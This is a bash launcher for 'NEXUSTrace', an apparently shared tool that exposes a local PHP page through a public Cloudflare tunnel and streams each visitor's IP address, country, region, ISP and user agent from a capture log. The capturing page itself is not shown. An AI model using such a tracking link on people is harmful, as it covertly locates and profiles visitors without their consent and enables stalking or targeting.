#!/usr/bin/env bash
# =========================================
# NEXUSTrace — Portable Live Monitor
# Ethical Use Only · Linux | WSL | Termux
# =========================================

set -e

# ---------- Colors (safe for Termux) ----------
if command -v tput >/dev/null 2>&1; then
  GREEN=$(tput setaf 2)
  RED=$(tput setaf 1)
  CYAN=$(tput setaf 6)
  YELLOW=$(tput setaf 3)
  BLUE=$(tput setaf 4)
  MAGENTA=$(tput setaf 5)
  BOLD=$(tput bold)
  RESET=$(tput sgr0)
else
  GREEN="\033[32m"
  RED="\033[31m"
  CYAN="\033[36m"
  YELLOW="\033[33m"
  BLUE="\033[34m"
  MAGENTA="\033[35m"
  BOLD="\033[1m"
  RESET="\033[0m"
fi

clear

# ---------- Banner ----------
echo -e "${CYAN}${BOLD}"
cat << "EOF"
███╗   ██╗   ████████╗██████╗  █████╗  ██████╗███████╗
████╗  ██║   ╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██╔════╝
██╔██╗ ██║█████╗██║   ██████╔╝███████║██║     █████╗
██║╚██╗██║╚════╝██║   ██╔══██╗██╔══██║██║     ██╔══╝
██║ ╚████║      ██║   ██║  ██║██║  ██║╚██████╗███████╗
╚═╝  ╚═══╝      ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝
EOF
echo -e "${RESET}"
echo -e "${YELLOW}${BOLD}N E X U S T R A C E${RESET}"
echo -e "${GREEN}Global Geolocation Beacon · Ethical Only${RESET}"
echo -e "${GREEN}by CHRIZ · SKY TECH&CRAFTS${RESET}\n"

# =========================================
# Utility functions
# =========================================

die() {
  echo -e "${RED}[!] $1${RESET}" >&2
  exit 1
}

info() {
  echo -e "${CYAN}[*] $1${RESET}"
}

ok() {
  echo -e "${GREEN}[✓] $1${RESET}"
}

# =========================================
# Platform & architecture detection
# =========================================

detect_platform() {
  if [ -n "$ANDROID_ROOT" ] || [ -d "/system/bin" ]; then
    PLATFORM="termux"
    OS_NAME="linux"
    ARCH_RAW=$(uname -m)
  elif grep -qi microsoft /proc/version 2>/dev/null; then
    PLATFORM="wsl"
    OS_NAME="linux"
    ARCH_RAW=$(uname -m)
  elif [ "$(uname -s)" = "Linux" ]; then
    PLATFORM="linux"
    OS_NAME="linux"
    ARCH_RAW=$(uname -m)
  else
    die "Unsupported platform"
  fi

  case "$ARCH_RAW" in
    x86_64 | amd64)
      ARCH_CF="amd64"
      ;;
    aarch64 | arm64 | arm64-v8a)
      ARCH_CF="arm64"
      ;;
    armv7l | armeabi-v7a | armeabi)
      ARCH_CF="arm"
      ;;
    i386 | i686)
      ARCH_CF="386"
      ;;
    *)
      die "Unsupported architecture: $ARCH_RAW"
      ;;
  esac

  info "Detected platform: $PLATFORM ($OS_NAME-$ARCH_CF)"
}

# =========================================
# Dependency checks
# =========================================

require_cmd() {
  local cmd="$1"
  local pkg="$2"

  if ! command -v "$cmd" >/dev/null 2>&1; then
    if [ "$PLATFORM" = "termux" ]; then
      info "Installing $pkg for Termux..."
      pkg install "$pkg" -y || die "Failed to install $pkg"
    else
      die "$cmd not found. Please install it manually."
    fi
  fi
}

# =========================================
# Cloudflared setup
# =========================================

setup_cloudflared() {
  CLOUDFLARED="./cloudflared"
  CF_URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-$ARCH_CF"

  if [ ! -f "$CLOUDFLARED" ]; then
    info "Downloading cloudflared ($ARCH_CF)..."
    curl -fsSL "$CF_URL" -o "$CLOUDFLARED" || die "Cloudflared download failed"
    chmod +x "$CLOUDFLARED"
  fi

  "$CLOUDFLARED" --version >/dev/null 2>&1 || die "Cloudflared verification failed"
  ok "Cloudflared ready"
}

# =========================================
# Runtime config
# =========================================

HOST="127.0.0.1"
PORT="8080"
CAPTURE_LOG="capture/nexustrace.log"
TUNNEL_LOG="tunnel_silent.log"

# =========================================
# Cleanup handler
# =========================================

cleanup() {
  echo -e "\n${RED}${BOLD}Stopping NEXUSTrace...${RESET}"
  kill "$PHP_PID" 2>/dev/null || true
  kill "$CF_PID" 2>/dev/null || true
  kill "$TAIL_PID" 2>/dev/null || true
  pkill -f cloudflared 2>/dev/null || true
  ok "All processes terminated"
  exit 0
}
trap cleanup INT TERM

# =========================================
# Main execution
# =========================================

detect_platform

require_cmd bash bash
require_cmd curl curl
require_cmd php php

setup_cloudflared

mkdir -p capture
touch "$CAPTURE_LOG"

php -S "$HOST:$PORT" > /dev/null 2>&1 &
PHP_PID=$!
ok "PHP server running"

nohup "$CLOUDFLARED" tunnel \
  --url "http://$HOST:$PORT" \
  --no-autoupdate \
  --protocol http2 \
  > "$TUNNEL_LOG" 2>&1 &
CF_PID=$!

sleep 6
ok "Tunnel started"

PUBLIC_URL=$(sed -n 's/.*\(https:\/\/[a-zA-Z0-9.-]*\.trycloudflare\.com\).*/\1/p' "$TUNNEL_LOG" | head -n1)
[ -n "$PUBLIC_URL" ] && echo -e "${CYAN}${BOLD}[*] Public URL:${RESET} ${GREEN}$PUBLIC_URL${RESET}"

# =========================================
# Live monitor
# =========================================

echo -e "\n${BLUE}${BOLD}📡 LIVE CAPTURE MONITOR${RESET}"
echo -e "${BLUE}════════════════════════════════════════${RESET}"

tail -n 0 -f "$CAPTURE_LOG" | while read -r line; do
  case "$line" in
    *"IP:"*)
      echo -e "\n${MAGENTA}${BOLD}━━━━━━━━━━ New Visitor ━━━━━━━━━━${RESET}"
      echo -e "${CYAN}🕒 Time:${RESET} ${YELLOW}$(date '+%Y-%m-%d %H:%M:%S')${RESET}"
      echo -e "${GREEN}🌐 IP:${RESET} ${line#*IP: }"
      ;;
    *"Country:"*)
      echo -e "${BLUE}📍 Country:${RESET} ${line#*Country: }"
      ;;
    *"Region:"*)
      echo -e "${BLUE}🏙 Region:${RESET} ${line#*Region: }"
      ;;
    *"ISP:"*)
      echo -e "${CYAN}🏢 ISP:${RESET} ${line#*ISP: }"
      ;;
    *"User-Agent:"*)
      echo -e "${YELLOW}🖥 User-Agent:${RESET} ${line#*User-Agent: }"
      echo -e "${MAGENTA}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESET}"
      ;;
  esac
done &

TAIL_PID=$!
wait
